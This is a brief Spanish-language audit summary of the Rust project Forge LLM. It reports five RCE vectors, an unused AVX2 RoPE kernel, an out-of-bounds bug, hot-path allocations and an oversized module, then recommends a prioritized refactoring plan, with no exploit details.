Forge LLM es un proyecto **maduro, disciplinado y con buena higiene de código** (clippy 0 warnings, FIX 1-41 sin regresión, build profile correcto). Las políticas P-XX están generalmente bien aplicadas.

Sin embargo, la auditoría reveló:

- **5 vectores RCE triviales** en módulos que parecen inofensivos (`rlvr.rs`, `sandbox.rs`, `workspace_agent.rs`).
- **1 kernel AVX2 disponible pero no usado** (RoPE) — 10-50× speedup gratis.
- **1 OOB latente en main.rs** (no en inference.rs) — divergencia entre dos paths.
- **6+ allocs en hot path** violando P-01.
- **1 god module de 5407 líneas** con 10+ responsabilidades.
- **~5-10 ms/chunk de overhead** por `std::env::var` + `is_x86_feature_detected!` + `Mutex` en hot path.

El proyecto tiene **alto retorno de inversión** en refactor: con 1 sprint de quick-wins se eliminan todas las vulnerabilidades críticas y se obtiene el speedup más impactante. Con 2 sprints adicionales se resuelve la deuda técnica estructural.

**Recomendación:** Ejecutar Sprint 1 (quick wins P0) antes de cualquier feature nueva. Luego priorizar Sprint 2 (refactor de `corpus_trainer.rs` y `trait Optimizer`).
